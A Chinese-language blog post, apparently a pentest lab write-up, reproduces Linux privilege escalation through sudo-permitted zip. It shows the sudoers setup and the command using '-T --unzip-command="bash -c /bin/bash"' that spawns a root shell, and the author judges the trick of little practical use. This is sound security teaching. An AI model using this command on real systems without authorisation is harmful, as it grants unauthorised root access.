---
title: 使用ZIP进行提权
tags:
  - Linux
  - ZIP Privilege Escalation
categories:
  - 漏洞复现
copyright: true
abbrlink: c80808d5
date: 2019-06-08 16:51:57
---

![](https://ae01.alicdn.com/kf/HTB1F0_Ob8GE3KVjSZFh763kaFXaa.png)
<!--more-->
今天看到一则推文：在linux中使用zip可以低权限用户提升为高权限。

当使用高权限运行时，zip的执行会发生变化。假设系统管理员已向普通用户授予sudo权限以运行zip，可导致低权限用户提升为高权限。

### 利用前提 ###

- 安装有zip(一般情况都装有)
- 允许本地用户已sudo权限运行zip

### 复现 ###

创建一个普通用户 `test`，并设置允许以`sudo`权限运行zip。

```bash
useradd -m test
passwd test
vi /etc/sudoers
```

![](https://ae01.alicdn.com/kf/HTB14MPNb.GF3KVjSZFv762_nXXaV.png)

ssh登录`test`

![](https://ae01.alicdn.com/kf/HTB1Ct_Ob8GE3KVjSZFh763kaFXaw.png)

touch一个txt文件(任意)，然后使用`-T`选项并用`--unzip-command`（调用命令），进行文件压缩。

```bash
touch fu.txt
sudo zip r.zip fu.txt -T --unzip-command="bash -c /bin/bash"
```

![](https://ae01.alicdn.com/kf/HTB11s_VbW1s3KVjSZFA760_ZXXaw.png)

### END ###

复现完这个，觉得好鸡肋。。。

这其实还是"使用" `sudo` 方式进行提权的，现在基本没有管理员会把普通用户加入到`sudoers`文件中了吧。

**Reference**

https://www.hackingarticles.in/linux-for-pentester-zip-privilege-escalation/